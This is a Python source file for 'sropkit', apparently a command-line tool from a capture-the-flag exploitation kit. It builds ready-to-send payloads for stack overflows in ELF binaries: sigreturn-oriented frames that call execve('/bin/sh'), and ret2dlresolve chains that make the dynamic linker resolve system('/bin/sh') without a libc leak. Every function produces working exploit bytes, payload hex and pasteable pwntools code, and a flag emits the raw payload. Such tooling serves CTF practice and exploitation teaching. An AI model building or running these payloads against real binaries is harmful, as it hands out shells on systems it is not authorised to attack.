"""sropkit: the two payloads for binaries with no leak and few gadgets.

SROP sets every register at once from a fake signal frame, so one
``syscall`` gadget is enough to call ``execve``.  ret2dlresolve makes the
dynamic linker resolve ``system`` for you, so a partial-RELRO binary needs
no libc leak at all.

    sropkit ./vuln --srop --offset 88
    sropkit ./vuln --dlresolve --offset 72 --symbol system
"""

from __future__ import annotations

import sys

from ctftools.core import gadgets as gadget_mod
from ctftools.core import term
from ctftools.core.binary import load_binary
from ctftools.core.cliutil import add_common_args, apply_output_flags, base_parser, fail, resolve_binary
from ctftools.core.report import Report

SYSCALL_NUMBERS = {"execve": 59, "read": 0, "write": 1, "open": 2, "mprotect": 10, "exit": 60}


class KitError(Exception):
    pass


def _context(path: str):
    from pwnlib.context import context
    from pwnlib.elf import ELF

    context.clear()
    context.log_level = "critical"
    elf = ELF(path, checksec=False)
    context.binary = elf
    return elf


def srop(info, offset: int | None, syscall_number: int = 59, path: str = "/bin/sh",
         string_at: int | None = None) -> Report:
    """Build a sigreturn frame that calls execve("/bin/sh", 0, 0)."""
    from pwnlib.rop.srop import SigreturnFrame
    from pwnlib.util.packing import p64

    elf = _context(info.path)
    report = Report(tool="sropkit", target=info.path)

    found = gadget_mod.find_gadgets(info, max_instructions=4)
    syscall = gadget_mod.best(found, "syscall")
    pop_rax = gadget_mod.best(found, "pop rax ; ret")
    sigreturn = gadget_mod.best(found, "mov eax, 0xf ; syscall") or gadget_mod.best(found, "mov rax, 0xf")

    if syscall is None:
        raise KitError("no syscall gadget: SROP needs one to trigger rt_sigreturn and again to run execve")
    if pop_rax is None and sigreturn is None:
        raise KitError(
            "no way to set rax to 15 (pop rax ; ret, or a mov eax, 0xf ; syscall gadget). "
            "A libc with __restore_rt gives you one, if you have a leak"
        )

    binsh = string_at
    if binsh is None:
        binsh = next(elf.search(path.encode() + b"\x00"), None)
    staged = binsh is None
    if staged:
        binsh = elf.bss(0x100)

    frame = SigreturnFrame(kernel="amd64")
    frame.rax = syscall_number
    frame.rdi = binsh
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall.address
    frame.rsp = elf.bss(0x400)

    chain = b""
    if pop_rax is not None:
        chain += p64(pop_rax.address) + p64(15)
        chain += p64(syscall.address)
    else:
        chain += p64(sigreturn.address)
    chain += bytes(frame)

    payload = (b"A" * offset + chain) if offset is not None else chain

    report.data.update({
        "kind": "srop",
        "syscall_gadget": syscall.address,
        "pop_rax_gadget": pop_rax.address if pop_rax else None,
        "frame_size": len(bytes(frame)),
        "payload_hex": payload.hex(),
        "chain_hex": chain.hex(),
        "binsh_address": binsh,
        "string_staged": staged,
    })

    sec = report.section("SROP frame")
    rows = [
        ["syscall gadget", hex(syscall.address), term.dim(syscall.text)],
        ["rax setter", hex(pop_rax.address) if pop_rax else term.dim("-"),
         term.dim(pop_rax.text if pop_rax else "using a sigreturn gadget")],
        ["frame", f"{len(bytes(frame))} bytes", term.dim("sets every register at once")],
        ["rax (syscall)", str(syscall_number), term.dim(_syscall_name(syscall_number))],
        ["rdi", hex(binsh), term.dim(f"address of {path!r}")],
        ["rip", hex(syscall.address), term.dim("the syscall runs here")],
    ]
    sec.add(term.table(rows))

    if staged:
        report.warn(
            f"there is no {path!r} string in the binary: the payload points at .bss "
            f"({binsh:#x}), so write the string there first (read(0, {binsh:#x}, 8) in an earlier chain)"
        )

    sec.add("")
    sec.add("  " + term.dim("total payload: ") + f"{len(payload)} bytes")
    sec.add("  " + term.dim("hex: ") + payload.hex()[:160] + ("..." if len(payload.hex()) > 160 else ""))

    code = report.section("Code that builds it")
    for line in [
        "from pwn import *",
        "frame = SigreturnFrame(kernel='amd64')",
        f"frame.rax = {syscall_number}        # {_syscall_name(syscall_number)}",
        f"frame.rdi = {binsh:#x}",
        "frame.rsi = 0",
        "frame.rdx = 0",
        f"frame.rip = {syscall.address:#x}   # syscall",
        f"frame.rsp = {elf.bss(0x400):#x}",
        "",
        "payload = flat({",
        f"    OFFSET: [{pop_rax.address:#x}, 15, {syscall.address:#x}, bytes(frame)],"
        if pop_rax else f"    OFFSET: [{sigreturn.address:#x}, bytes(frame)],",
        "})",
    ]:
        code.add(f"    {line}")
    return report


def dlresolve(info, offset: int | None, symbol: str = "system", argument: str = "/bin/sh") -> Report:
    """Make the dynamic linker resolve a function for us: no leak required."""
    from pwnlib.rop import ROP
    from pwnlib.rop.ret2dlresolve import Ret2dlresolvePayload

    elf = _context(info.path)
    report = Report(tool="sropkit", target=info.path)

    if info.statically_linked:
        raise KitError("the binary is statically linked: there is no dynamic linker to abuse")
    if info.relro == "Full RELRO":
        raise KitError("Full RELRO: the linker resolves everything at startup, ret2dlresolve will not work")

    try:
        payload_builder = Ret2dlresolvePayload(elf, symbol=symbol, args=[argument])
        rop = ROP(elf)
        rop.ret2dlresolve(payload_builder)
        chain = rop.chain() + payload_builder.payload
    except Exception as exc:
        message = str(exc)
        if "setRegisters" in message:
            raise KitError(
                "the binary has no gadget to set the argument register, so the resolved "
                "function cannot be called with an argument. Find a 'pop rdi ; ret' "
                "(gadgetfind), or resolve a function that needs no argument"
            )
        raise KitError(f"could not build a ret2dlresolve payload: {message}")
    payload = (b"A" * offset + chain) if offset is not None else chain

    report.data.update({
        "kind": "ret2dlresolve",
        "symbol": symbol,
        "argument": argument,
        "data_address": payload_builder.data_addr,
        "payload_hex": payload.hex(),
        "chain_length": len(chain),
    })

    sec = report.section("ret2dlresolve")
    sec.add(term.table([
        ["symbol", symbol, term.dim("resolved by the linker at call time")],
        ["argument", repr(argument), ""],
        ["forged structures at", hex(payload_builder.data_addr), term.dim("writable, usually .bss")],
        ["relro", info.relro, term.good("usable") if info.relro != "Full RELRO" else term.bad("blocked")],
        ["payload", f"{len(payload)} bytes", ""],
    ]))
    sec.add("")
    sec.add("  " + term.dim("hex: ") + payload.hex()[:160] + ("..." if len(payload.hex()) > 160 else ""))

    code = report.section("Code that builds it")
    for line in [
        "from pwn import *",
        "exe = context.binary = ELF('./vuln')",
        f"dl = Ret2dlresolvePayload(exe, symbol={symbol!r}, args=[{argument!r}])",
        "rop = ROP(exe)",
        "rop.read(0, dl.data_addr)       # stage the forged structures",
        "rop.ret2dlresolve(dl)",
        "io.sendline(flat({OFFSET: rop.chain()}))",
        "io.sendline(dl.payload)",
    ]:
        code.add(f"    {line}")

    report.note("the forged Elf_Rela/Elf_Sym structures must be written to data_addr before the chain runs; "
                "the usual way is a read() earlier in the same chain")
    return report


def _syscall_name(number: int) -> str:
    for name, value in SYSCALL_NUMBERS.items():
        if value == number:
            return name
    return f"syscall {number}"


def build_parser():
    parser = base_parser("sropkit", "Build SROP frames and ret2dlresolve payloads.")
    parser.add_argument("binary", help="the ELF to build for")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--srop", action="store_const", const="srop", dest="kind",
                       help="build a sigreturn frame calling execve")
    group.add_argument("--dlresolve", action="store_const", const="dlresolve", dest="kind",
                       help="build a ret2dlresolve payload (no libc leak needed)")
    parser.add_argument("--offset", type=int, help="filler bytes before the payload")
    parser.add_argument("--syscall", type=int, default=59, help="syscall number for SROP (default: 59, execve)")
    parser.add_argument("--string", default="/bin/sh", help="string to pass (default: /bin/sh)")
    parser.add_argument("--string-at", type=lambda v: int(v, 0), help="address where that string already is")
    parser.add_argument("--symbol", default="system", help="symbol for ret2dlresolve (default: system)")
    parser.add_argument("--raw", action="store_true", help="write the raw payload to stdout and nothing else")
    add_common_args(parser)
    return parser


def main(argv=None) -> int:
    args = build_parser().parse_args(argv)
    apply_output_flags(args)
    info = load_binary(resolve_binary(args.binary))

    try:
        if args.kind == "srop":
            report = srop(info, args.offset, args.syscall, args.string, args.string_at)
        else:
            report = dlresolve(info, args.offset, args.symbol, args.string)
    except KitError as exc:
        fail(str(exc))

    if args.raw:
        sys.stdout.buffer.write(bytes.fromhex(report.data["payload_hex"]))
        return 0
    report.emit(as_json=args.json)
    return 0


if __name__ == "__main__":
    sys.exit(main())
